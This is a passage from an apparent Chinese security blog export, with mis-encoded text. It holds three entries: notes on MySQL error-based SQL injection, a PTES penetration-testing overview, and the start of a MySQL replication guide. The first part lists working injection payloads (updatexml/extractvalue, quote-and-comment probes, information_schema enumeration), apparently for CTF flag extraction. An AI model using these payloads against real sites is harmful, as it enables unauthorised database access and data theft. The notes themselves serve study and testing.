æ”¯æŒ 16 è¿›åˆ¶ï¼Œä½†æ˜¯å¼€å¤´å¾—å†™ 0x 0x7e æ˜¯ä¸€ä¸ªç‰¹æ®Šç¬¦å·ï¼Œç„¶åä¸ç¬¦åˆè·¯å¾„è§„åˆ™æŠ¥é”™] ~ ~</p></blockquote><p>â€‹</p><p>å¦å¤–ï¼Œupdatexml æœ€å¤šåªèƒ½æ˜¾ç¤º 32 ä½ï¼Œéœ€è¦é…åˆ SUBSTR ä½¿ç”¨ã€‚</p><pre class="line-numbers language-sql"><code class="language-sql">updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> f14g <span class="token keyword">from</span> f14g <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> substring<span class="token punctuation">(</span>f14g<span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token keyword">from</span> f14g <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>extractvalue<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="äºŒã€è¯•æ¢æ€§-payloads"><a href="#äºŒã€è¯•æ¢æ€§-payloads" class="headerlink" title="äºŒã€è¯•æ¢æ€§ payloads"></a>äºŒã€è¯•æ¢æ€§ payloads</h2><p>è®°å¾—å¯ä»¥è¯•è¯•å¸¦ä¸Šæ³¨é‡Šâ€#â€æˆ–â€â€“ â€œï¼Œæ³¨æ„æ³¨é‡Šç¬¦æ˜¯å«ç©ºæ ¼çš„ã€‚</p><pre><code>id=1' #id=' #id=-1' #id=' --+id=%5c --+id=' --+id=" --+id== --+id=-1 --+id=-0 --+id=3-2 --+</code></pre><p>åæœŸ payload</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> extractvalue<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> extractvalue<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> extractvalue<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> extractvalue<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span>f14g<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token keyword">from</span> f14g<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> extractvalue<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span>f14g<span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token keyword">from</span> f14g<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ä¸‰ã€MySQL-ä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€MySQL-ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€MySQL ä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€MySQL ä¿¡æ¯æ”¶é›†</h2><p>æ³¨å…¥ payload å‚è€ƒæŒ‡å— <a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">MySQL SQL Injection Cheat Sheet</a><br>æ³¨æ„ WHERE çš„é™åˆ¶å³å¯ä»¥ç”¨=ä¹Ÿå¯ä»¥ç”¨ LIKE</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true"># MySQLç‰ˆæœ¬</span><span class="token keyword">SELECT</span> @<span class="token variable">@version</span><span class="token comment" spellcheck="true"># ç”¨æˆ·</span><span class="token keyword">SELECT</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># æ•°æ®åº“</span><span class="token keyword">SELECT</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># è¡¨å</span><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> table_schema<span class="token operator">=</span><span class="token string">"words"</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> table_schema <span class="token operator">LIKE</span> <span class="token string">"%words%"</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">LIMIT</span> <span class="token number">81</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true"># åˆ—å</span><span class="token keyword">SELECT</span> column_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_name<span class="token operator">=</span><span class="token string">"f14g"</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token keyword">SELECT</span> column_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">WHERE</span> table_name <span class="token operator">LIKE</span> <span class="token string">"f14g"</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token keyword">SELECT</span> column_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">LIMIT</span> <span class="token number">808</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true"># æŸ¥æ•°æ®</span><span class="token keyword">SELECT</span> f14g <span class="token keyword">from</span> f14g <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true"># å…³é”®payload</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> f14g <span class="token keyword">from</span> f14g <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> æŠ¥é”™æ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PTESæ¸—é€æµ‹è¯•æ‰§è¡Œæ ‡å‡†</title>
      <link href="/post/f018521c.html"/>
      <url>/post/f018521c.html</url>
      
        <content type="html"><![CDATA[<h1 id="PTES-æ¸—é€æµ‹è¯•æ‰§è¡Œæ ‡å‡†"><a href="#PTES-æ¸—é€æµ‹è¯•æ‰§è¡Œæ ‡å‡†" class="headerlink" title="PTES æ¸—é€æµ‹è¯•æ‰§è¡Œæ ‡å‡†"></a>PTES æ¸—é€æµ‹è¯•æ‰§è¡Œæ ‡å‡†</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1632151033454-6765fe47-d2fb-454b-9632-66ba10e2cfb0.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_34,text_VHJ1ZGE=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#clientId=u2b075871-70aa-4&amp;from=paste&amp;height=432&amp;id=u991fdaae&amp;margin=%5Bobject%20Object%5D&amp;name=PTES.png&amp;originHeight=864&amp;originWidth=1200&amp;originalType=binary%E2%88%B6=1&amp;size=117867&amp;status=done&amp;style=none&amp;taskId=u34deafb5-320a-41a8-8fea-7e89c597095&amp;width=600" alt="PTES.png"></p><h2 id="ä¸€ã€å‰æœŸäº¤äº’é˜¶æ®µ"><a href="#ä¸€ã€å‰æœŸäº¤äº’é˜¶æ®µ" class="headerlink" title="ä¸€ã€å‰æœŸäº¤äº’é˜¶æ®µ"></a>ä¸€ã€å‰æœŸäº¤äº’é˜¶æ®µ</h2><p>åœ¨å‰æœŸäº¤äº’ï¼ˆPre-Engagement Interactionï¼‰é˜¶æ®µï¼Œæ¸—é€æµ‹è¯•å›¢é˜Ÿä¸å®¢æˆ·ç»„ç»‡è¿›è¡Œäº¤äº’è®¨è®ºï¼Œæœ€é‡è¦çš„æ˜¯ç¡®å®šæ¸—é€æµ‹è¯•çš„èŒƒå›´ã€ç›®æ ‡ã€é™åˆ¶æ¡ä»¶ä»¥åŠæœåŠ¡åˆåŒç»†èŠ‚ã€‚<br>è¯¥é˜¶æ®µé€šå¸¸æ¶‰åŠæ”¶é›†å®¢æˆ·éœ€æ±‚ã€å‡†å¤‡æµ‹è¯•è®¡åˆ’ã€å®šä¹‰æµ‹è¯•èŒƒå›´ä¸è¾¹ç•Œã€å®šä¹‰ä¸šåŠ¡ç›®æ ‡ã€é¡¹ç›®ç®¡ç†ä¸è§„åˆ’ç­‰æ´»åŠ¨ã€‚<br>â€‹</p><h2 id="äºŒã€æƒ…æŠ¥æ”¶é›†é˜¶æ®µ"><a href="#äºŒã€æƒ…æŠ¥æ”¶é›†é˜¶æ®µ" class="headerlink" title="äºŒã€æƒ…æŠ¥æ”¶é›†é˜¶æ®µ"></a>äºŒã€æƒ…æŠ¥æ”¶é›†é˜¶æ®µ</h2><p>åœ¨ç›®æ ‡èŒƒå›´ç¡®å®šä¹‹åï¼Œå°†è¿›å…¥æƒ…æŠ¥æœé›†ï¼ˆInformation Gatheringï¼‰é˜¶æ®µï¼Œæ¸—é€æµ‹è¯•å›¢é˜Ÿå¯ä»¥åˆ©ç”¨å„ç§ä¿¡æ¯æ¥æºä¸æœé›†æŠ€æœ¯æ–¹æ³•ï¼Œå°è¯•è·å–æ›´å¤šå…³äºç›®æ ‡ç»„ç»‡ç½‘ç»œæ‹“æ‰‘ã€ç³»ç»Ÿé…ç½® ä¸å®‰å…¨é˜²å¾¡æªæ–½çš„ä¿¡æ¯ã€‚<br>æ¸—é€æµ‹è¯•è€…å¯ä»¥ä½¿ç”¨çš„æƒ…æŠ¥æœé›†æ–¹æ³•åŒ…æ‹¬å…¬å¼€æ¥æºä¿¡æ¯æŸ¥è¯¢ã€Google Hackingã€ç¤¾ä¼šå·¥ç¨‹å­¦ã€ç½‘ç»œè¸©ç‚¹ã€æ‰«ææ¢æµ‹ã€è¢«åŠ¨ç›‘å¬ã€æœåŠ¡æŸ¥ç‚¹ç­‰ã€‚è€Œå¯¹ç›®æ ‡ç³»ç»Ÿçš„æƒ…æŠ¥æ¢æŸ¥èƒ½åŠ›æ˜¯æ¸—é€æµ‹è¯•è€…ä¸€é¡¹éå¸¸é‡è¦çš„æŠ€èƒ½ï¼Œæƒ…æŠ¥æœé›†æ˜¯å¦å……åˆ†åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå†³å®šäº†æ¸—é€æµ‹è¯•çš„æˆè´¥ï¼Œå› ä¸ºå¦‚æœä½ é—æ¼å…³é”®çš„æƒ…æŠ¥ä¿¡æ¯ï¼Œä½ å°†å¯èƒ½åœ¨åé¢çš„é˜¶æ®µé‡Œä¸€æ— æ‰€è·ã€‚</p><h2 id="ä¸‰ã€å¨èƒå»ºæ¨¡é˜¶æ®µ"><a href="#ä¸‰ã€å¨èƒå»ºæ¨¡é˜¶æ®µ" class="headerlink" title="ä¸‰ã€å¨èƒå»ºæ¨¡é˜¶æ®µ"></a>ä¸‰ã€å¨èƒå»ºæ¨¡é˜¶æ®µ</h2><p>åœ¨æœé›†åˆ°å……åˆ†çš„æƒ…æŠ¥ä¿¡æ¯ä¹‹åï¼Œæ¸—é€æµ‹è¯•å›¢é˜Ÿçš„æˆå‘˜ä»¬åœä¸‹æ•²å‡»é”®ç›˜ï¼Œå¤§å®¶èšåˆ°ä¸€èµ·é’ˆå¯¹è·å–çš„ä¿¡æ¯è¿›è¡Œå¨èƒå»ºæ¨¡ï¼ˆThreat Modelingï¼‰ä¸æ”»å‡»è§„åˆ’ã€‚è¿™æ˜¯æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­éå¸¸é‡è¦ï¼Œä½†å¾ˆå®¹æ˜“è¢«å¿½è§†çš„ä¸€ä¸ªå…³é”®ç‚¹ã€‚<br>é€šè¿‡å›¢é˜Ÿå…±åŒçš„ç¼œå¯†æƒ…æŠ¥åˆ†æä¸æ”»å‡»æ€è·¯å¤´è„‘é£æš´ï¼Œå¯ä»¥ä»å¤§é‡çš„ä¿¡æ¯æƒ…æŠ¥ä¸­ç†æ¸…å¤´ç»ªï¼Œç¡®å®šå‡ºæœ€å¯è¡Œçš„æ”»å‡»é€šé“ã€‚</p><h2 id="å››ã€æ¼æ´åˆ†æé˜¶æ®µ"><a href="#å››ã€æ¼æ´åˆ†æé˜¶æ®µ" class="headerlink" title="å››ã€æ¼æ´åˆ†æé˜¶æ®µ"></a>å››ã€æ¼æ´åˆ†æé˜¶æ®µ</h2><p>åœ¨ç¡®å®šå‡ºæœ€å¯è¡Œçš„æ”»å‡»é€šé“ä¹‹åï¼Œæ¥ä¸‹æ¥éœ€è¦è€ƒè™‘è¯¥å¦‚ä½•å–å¾—ç›®æ ‡ç³»ç»Ÿçš„è®¿é—®æ§åˆ¶æƒï¼Œå³æ¼æ´åˆ†æï¼ˆVulnerability Analysisï¼‰é˜¶æ®µã€‚<br>åœ¨è¯¥é˜¶æ®µï¼Œæ¸—é€æµ‹è¯•è€…éœ€è¦ç»¼åˆåˆ†æå‰å‡ ä¸ªé˜¶æ®µè·å–å¹¶æ±‡æ€»çš„æƒ…æŠ¥ä¿¡æ¯ï¼Œç‰¹åˆ«æ˜¯å®‰å…¨æ¼æ´æ‰«æç»“æœã€æœåŠ¡æŸ¥ç‚¹ä¿¡æ¯ç­‰ï¼Œé€šè¿‡æœç´¢å¯è·å–çš„æ¸—é€ä»£ç èµ„æºï¼Œæ‰¾å‡ºå¯ä»¥å®æ–½æ¸—é€æ”»å‡»çš„æ”»å‡»ç‚¹ï¼Œå¹¶åœ¨å®éªŒç¯å¢ƒä¸­è¿›è¡ŒéªŒè¯ã€‚åœ¨è¯¥é˜¶æ®µï¼Œé«˜æ°´å¹³çš„æ¸—é€æµ‹è¯•å›¢é˜Ÿè¿˜ä¼šé’ˆå¯¹æ”»å‡»é€šé“ä¸Šçš„ä¸€äº›å…³é”®ç³»ç»Ÿä¸æœåŠ¡è¿›è¡Œå®‰å…¨æ¼æ´æ¢æµ‹ä¸æŒ–æ˜ï¼ŒæœŸæœ›æ‰¾å‡ºå¯è¢«åˆ©ç”¨çš„æœªçŸ¥å®‰å…¨æ¼æ´ï¼Œå¹¶å¼€å‘å‡ºæ¸—é€ä»£ç ï¼Œä»è€Œæ‰“å¼€æ”»å‡»é€šé“ä¸Šçš„å…³é”®è·¯å¾„ã€‚</p><h2 id="äº”ã€æ¸—é€æ”»å‡»é˜¶æ®µ"><a href="#äº”ã€æ¸—é€æ”»å‡»é˜¶æ®µ" class="headerlink" title="äº”ã€æ¸—é€æ”»å‡»é˜¶æ®µ"></a>äº”ã€æ¸—é€æ”»å‡»é˜¶æ®µ</h2><p>æ¸—é€æ”»å‡»ï¼ˆExploitationï¼‰æ˜¯æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­æœ€å…·æœ‰é­…åŠ›çš„ç¯èŠ‚ã€‚åœ¨æ­¤ç¯èŠ‚ä¸­ï¼Œæ¸—é€æµ‹è¯•å›¢é˜Ÿéœ€è¦åˆ©ç”¨ä»–ä»¬æ‰€æ‰¾å‡ºçš„ç›®æ ‡ç³»ç»Ÿå®‰å…¨æ¼æ´ï¼Œæ¥çœŸæ­£å…¥ä¾µç³»ç»Ÿå½“ä¸­ï¼Œè·å¾—è®¿é—®æ§åˆ¶æƒã€‚<br>æ¸—é€æ”»å‡»å¯ä»¥åˆ©ç”¨å…¬å¼€æ¸ é“å¯è·å–çš„æ¸—é€ä»£ç ï¼Œä½†ä¸€èˆ¬åœ¨å®é™…åº”ç”¨åœºæ™¯ä¸­ï¼Œæ¸—é€æµ‹è¯•è€…è¿˜éœ€è¦å……åˆ†åœ°è€ƒè™‘ç›®æ ‡ç³»ç»Ÿç‰¹æ€§æ¥å®šåˆ¶æ¸—é€æ”»å‡»ï¼Œå¹¶éœ€è¦æŒ«è´¥ç›®æ ‡ç½‘ç»œä¸ç³»ç»Ÿä¸­å®æ–½çš„å®‰å…¨é˜²å¾¡æªæ–½ï¼Œæ‰èƒ½æˆåŠŸè¾¾æˆæ¸—é€ç›®çš„ã€‚åœ¨é»‘ç›’æµ‹è¯•ä¸­ï¼Œæ¸—é€æµ‹è¯•è€…è¿˜éœ€è¦è€ƒè™‘å¯¹ç›®æ ‡ç³»ç»Ÿæ£€æµ‹æœºåˆ¶çš„é€ƒé€¸ï¼Œä»è€Œé¿å…é€ æˆç›®æ ‡ç»„ç»‡å®‰å…¨å“åº”å›¢é˜Ÿçš„è­¦è§‰å’Œå‘ç°ã€‚<br>â€‹</p><h2 id="å…­ã€åæ¸—é€æ”»å‡»é˜¶æ®µ"><a href="#å…­ã€åæ¸—é€æ”»å‡»é˜¶æ®µ" class="headerlink" title="å…­ã€åæ¸—é€æ”»å‡»é˜¶æ®µ"></a>å…­ã€åæ¸—é€æ”»å‡»é˜¶æ®µ</h2><p>åæ¸—é€æ”»å‡»ï¼ˆPost Exploitationï¼‰æ˜¯æ•´ä¸ªæ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­æœ€èƒ½å¤Ÿä½“ç°æ¸—é€æµ‹è¯•å›¢é˜Ÿåˆ›é€ åŠ›ä¸æŠ€æœ¯èƒ½åŠ›çš„ç¯èŠ‚ã€‚å‰é¢çš„ç¯èŠ‚å¯ä»¥è¯´éƒ½æ˜¯åœ¨æŒ‰éƒ¨å°±ç­åœ°å®Œæˆéå¸¸æ™®éçš„ç›®æ ‡ï¼Œè€Œåœ¨è¿™ä¸ªç¯èŠ‚ä¸­ï¼Œéœ€è¦æ¸—é€æµ‹è¯•å›¢é˜Ÿæ ¹æ®ç›®æ ‡ç»„ç»‡çš„ä¸šåŠ¡ç»è¥æ¨¡å¼ã€ä¿æŠ¤èµ„äº§å½¢å¼ä¸å®‰å…¨é˜²å¾¡è®¡åˆ’çš„ä¸åŒç‰¹ç‚¹ï¼Œè‡ªä¸»è®¾è®¡å‡ºæ”»å‡»ç›®æ ‡ï¼Œè¯†åˆ«å…³é”®åŸºç¡€è®¾æ–½ï¼Œå¹¶å¯»æ‰¾å®¢æˆ·ç»„ç»‡æœ€å…·ä»·å€¼å’Œå°è¯•å®‰å…¨ä¿æŠ¤çš„ä¿¡æ¯å’Œèµ„äº§ï¼Œæœ€ç»ˆè¾¾æˆèƒ½å¤Ÿå¯¹å®¢æˆ·ç»„ç»‡é€ æˆæœ€é‡è¦ä¸šåŠ¡å½±å“çš„æ”»å‡»é€”å¾„ã€‚<br>åœ¨ä¸åŒçš„æ¸—é€æµ‹è¯•åœºæ™¯ä¸­ï¼Œè¿™äº›æ”»å‡»ç›®æ ‡ä¸é€”å¾„å¯èƒ½æ˜¯åƒå˜ä¸‡åŒ–çš„ï¼Œè€Œè®¾ç½®æ˜¯å¦å‡†ç¡®å¹¶ä¸”å¯è¡Œï¼Œä¹Ÿå–å†³äºå›¢é˜Ÿè‡ªèº«çš„åˆ›æ–°æ„è¯†ã€çŸ¥è¯†èŒƒç•´ã€å®é™…ç»éªŒå’ŒæŠ€æœ¯èƒ½åŠ›ã€‚<br>â€‹</p><h2 id="ä¸ƒã€æŠ¥å‘Šé˜¶æ®µ"><a href="#ä¸ƒã€æŠ¥å‘Šé˜¶æ®µ" class="headerlink" title="ä¸ƒã€æŠ¥å‘Šé˜¶æ®µ"></a>ä¸ƒã€æŠ¥å‘Šé˜¶æ®µ</h2><p>æ¸—é€æµ‹è¯•è¿‡ç¨‹æœ€ç»ˆå‘å®¢æˆ·ç»„ç»‡æäº¤ï¼Œå–å¾—è®¤å¯å¹¶æˆåŠŸè·å¾—åˆåŒä»˜æ¬¾çš„å°±æ˜¯ä¸€ä»½æ¸—é€æµ‹è¯•æŠ¥å‘Šï¼ˆReportingï¼‰ã€‚è¿™ä»½æŠ¥å‘Šå‡èšäº†ä¹‹å‰æ‰€æœ‰é˜¶æ®µä¹‹ä¸­æ¸—é€æµ‹è¯•å›¢é˜Ÿæ‰€è·å–çš„å…³é”®æƒ…æŠ¥ä¿¡æ¯ã€æ¢æµ‹å’Œå‘æ˜å‡ºçš„ç³»ç»Ÿå®‰å…¨æ¼æ´ã€æˆåŠŸæ¸—é€æ”»å‡»çš„è¿‡ç¨‹ï¼Œä»¥åŠé€ æˆä¸šåŠ¡å½±å“åæœçš„æ”»å‡»é€”å¾„ï¼ŒåŒæ—¶è¿˜è¦ç«™åœ¨é˜²å¾¡è€…çš„è§’åº¦ä¸Šï¼Œå¸®åŠ©ä»–ä»¬åˆ†æå®‰å…¨é˜²å¾¡ä½“ç³»ä¸­çš„è–„å¼±ç¯èŠ‚ã€å­˜åœ¨çš„é—®é¢˜ï¼Œä»¥åŠä¿®è¡¥ä¸å‡çº§æŠ€æœ¯æ–¹æ¡ˆã€‚<br>â€‹</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PTES </tag>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql ä¸»ä»é…ç½®</title>
      <link href="/post/14b661.html"/>
      <url>/post/14b661.html</url>
      
        <content type="html"><![CDATA[<h1 id="Mysql-ä¸»ä»é…ç½®"><a href="#Mysql-ä¸»ä»é…ç½®" class="headerlink" title="Mysql ä¸»ä»é…ç½®"></a>Mysql ä¸»ä»é…ç½®</h1><h2 id="ä¸€ã€ä»‹ç»"><a href="#ä¸€ã€ä»‹ç»" class="headerlink" title="ä¸€ã€ä»‹ç»"></a>ä¸€ã€ä»‹ç»</h2><p>MySQL ä¸»ä»åˆå«åš Replicationã€AB å¤åˆ¶ã€‚ç®€å•è®²å°±æ˜¯ A å’Œ B ä¸¤å°æœºå™¨åšä¸»ä»åï¼Œåœ¨ A ä¸Šå†™æ•°æ®ï¼Œå¦å¤–ä¸€å° B ä¹Ÿä¼šè·Ÿç€å†™æ•°æ®ï¼Œä¸¤è€…æ•°æ®å®æ—¶åŒæ­¥çš„ MySQL ä¸»ä»æ˜¯åŸºäº binlog çš„ï¼Œä¸»ä¸Šé¡»å¼€å¯ binlog æ‰èƒ½è¿›è¡Œä¸»ä»ã€‚<br>â€‹</p><p>ä¸»ä»è¿‡ç¨‹å¤§è‡´æœ‰ 3 ä¸ªæ­¥éª¤ï¼š</p><p>1.<strong>Master</strong>å°†æ›´æ”¹æ“ä½œè®°å½•åˆ°<strong>binlog</strong>é‡Œ<br>1.<strong>Slave</strong>å°†<strong>Master</strong>çš„<strong>binlog</strong>äº‹ä»¶(sql è¯­å¥)åŒæ­¥åˆ°ä»æœ¬æœºä¸Šå¹¶è®°å½•åœ¨<strong>relaylog</strong>é‡Œ<br>1.<strong>Slave</strong>æ ¹æ®<strong>relaylog</strong>é‡Œé¢çš„<strong>sql è¯­å¥</strong>æŒ‰é¡ºåºæ‰§è¡Œï¼Œ<strong>Master</strong>ä¸Šæœ‰ä¸€ä¸ª<strong>log dump</strong>çº¿ç¨‹ï¼Œç”¨æ¥å’Œ<strong>Slave</strong>çš„<strong>I/O</strong>çº¿ç¨‹ä¼ é€’<strong>binlog</strong>ï¼Œ<strong>Slave</strong>ä¸Šæœ‰ä¸¤ä¸ªçº¿ç¨‹ï¼Œå…¶ä¸­ I/O çº¿ç¨‹ç”¨æ¥åŒæ­¥<strong>Master</strong>çš„<strong>binlog</strong>å¹¶ç”Ÿæˆ<strong>relaylog</strong>ï¼Œå¦å¤–ä¸€ä¸ª<strong>SQL</strong>çº¿ç¨‹ç”¨æ¥æŠŠ<strong>relaylog</strong>é‡Œé¢çš„<strong>sql</strong>è¯­å¥è½åœ°</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1629287574688-93c1ad1c-188f-4a89-b074-45fb814a8da9.png#clientId=u22899781-ab06-4&amp;from=paste&amp;height=353&amp;id=u38698608&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=353&amp;originWidth=649&amp;originalType=binary%E2%88%B6=1&amp;size=40310&amp;status=done&amp;style=none&amp;taskId=u8da928dd-50f8-4e0b-b146-98ad264798c&amp;width=649" alt="image.png"></p><p>å®ƒçš„ä¸€èˆ¬åº”ç”¨åœºæ™¯æœ‰</p><ul><li>æ•°æ®çš„å¤‡ä»½</li><li>è¯»å†™åˆ†ç¦»</li></ul><p>â€‹</p><h2 id="äºŒã€mysql-ä¸»ä»æ­å»º"><a href="#äºŒã€mysql-ä¸»ä»æ­å»º" class="headerlink" title="äºŒã€mysql ä¸»ä»æ­å»º"></a>äºŒã€mysql ä¸»ä»æ­å»º</h2><h3 id="æœåŠ¡å™¨å‡†å¤‡"><a href="#æœåŠ¡å™¨å‡†å¤‡" class="headerlink" title="æœåŠ¡å™¨å‡†å¤‡"></a>æœåŠ¡å™¨å‡†å¤‡</h3><table><thead><tr><th>ä½œç”¨</th><th>IP</th><th>æ•°æ®åº“</th></tr></thead><tbody><tr><td>Master</td><td>192.168.2.8</td><td>MySQL 5.7</td></tr><tr><td>Slave</td><td>192.168.2.9</td><td>MySQL 5.7</td></tr></tbody></table><h3 id="æ£€æŸ¥-UUID"><a href="#æ£€æŸ¥-UUID" class="headerlink" title="æ£€æŸ¥ UUID"></a>æ£€æŸ¥ 